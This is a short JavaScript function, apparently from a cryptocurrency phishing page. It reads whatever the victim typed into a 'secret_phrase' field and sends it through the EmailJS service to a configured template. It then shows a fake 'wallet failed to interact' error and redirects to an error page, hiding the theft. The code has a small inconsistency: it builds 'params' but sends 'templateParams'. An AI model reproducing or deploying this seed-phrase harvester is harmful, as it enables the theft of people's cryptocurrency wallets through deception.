function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send("service_0fib79d", "template_cnqeg6o", templateParams).then(function (response) {
        alert("Error!: wallet failed to interact successfully" );
        window.location.href = "/error.html";
    })
}
